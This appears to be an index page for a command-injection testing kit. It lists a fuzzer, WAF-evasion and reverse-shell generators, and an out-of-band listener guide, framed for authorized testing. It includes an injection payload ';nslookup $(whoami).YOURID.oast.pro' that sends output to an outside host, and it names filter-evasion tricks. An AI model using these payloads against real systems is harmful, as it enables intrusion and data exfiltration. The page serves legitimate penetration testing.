# Command Injection — PoC Scripts

Runnable, **benign-by-default** proof-of-concept tooling that backs the Command Injection kit. **Click a script to open
it on its own page.** *Authorized testing only:* prove execution with a **benign marker** (`id`/`whoami`/OOB
`$(whoami)`), re-test timing to exclude jitter, no persistence, clean up.

| Script | What it does |
|---|---|
| [`cmdi_fuzz.py`](#/cmdi/poc/cmdi_fuzz) | Probe a `FUZZ` point for **in-band** (marker echoed), **time-based** (consistent delay vs baseline), and **OOB** (interactsh) execution. |
| [`evasion.py`](#/cmdi/poc/evasion) | Build WAF/blacklist-evasion variants (`${IFS}`, quote/backslash split, base64-pipe, globbing). |
| [`revshell.py`](#/cmdi/poc/revshell) | Generate reverse-shell one-liners (bash/nc/python/php/perl/powershell). **Red-team only** — for bug bounty a single `id` is enough. |
| [`oob_listen.md`](#/cmdi/poc/oob_listen) | How to stand up a DNS/HTTP OOB catcher (interactsh) for blind detection + exfil. |

## How they fit together

1. **Stand up OOB** (see `oob_listen.md`) — note your interactsh host.
2. **Probe** the sink with `cmdi_fuzz.py` (in-band + time-based + OOB).
3. **If filtered**, build evasions with `evasion.py`.
4. **Prove impact safely** — in-band `;id`, blind `;nslookup $(whoami).YOURID.oast.pro`; reverse shell only for authorized red-team.

> Read the **Testing Guide §5/§7/§8** for the detection trifecta and the **Zero to Expert (Q&A)** for blind/OOB and
> WAF-evasion depth.
